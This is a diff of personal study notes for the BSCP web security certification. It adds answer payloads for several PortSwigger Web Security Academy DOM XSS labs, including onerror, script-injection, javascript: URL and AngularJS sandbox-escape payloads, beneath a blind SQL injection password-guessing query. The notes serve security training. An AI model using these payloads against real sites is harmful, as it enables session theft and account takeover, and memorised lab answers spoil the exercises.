@@ -26,3 +26,27 @@ Am i getting ready for BSCP? I don't know
 
         #SUBSTRING PASSWORD GUESSING WITH CASE - HOME LAB
         select password (case when substring(password, 2,1) = 'u' then "RIGHT" else "NOOO" end) from blah where user = 'nobody';
+## XSS
+### DOM XSS in document.write sink using source location.search [APPRENTICE]
+    answer: "><img%20src=x%20onerror=alert()>
+
+### DOM XSS in document.write sink using source location.search inside a select element [PRACTITIONER]
+    answer: &storeId=</option><script>alert()</script>
+
+### DOM XSS in innerHTML sink using source location.search [APPRENTICE]
+    answer: '><img src=x onerror=alert()>
+
+### DOM XSS in jQuery anchor href attribute sink using location.search source [APPRENTICE]
+    answer: javascript:alert(document.cookie)
+
+### DOM XSS in jQuery selector sink using a hashchange event [APPRENTICE]
+    answer: <iframe height="900" width="900" src="https://0abd009b04972d7c8140164f002a0029.web-security-academy.net/#" onload="this.src+='<img src=x onerror=print()>'"></iframe>
+
+### DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded [APPRENTICE]
+    answer: {{constructor.constructor('alert(1)')()}}
+
+### Reflected DOM XSS [PRACTITIONER]
+    answer: \"-alert()}//
+
+### Stored DOM XSS
+    answer: bar</section></p>foo<img src=x onerror=alert()>
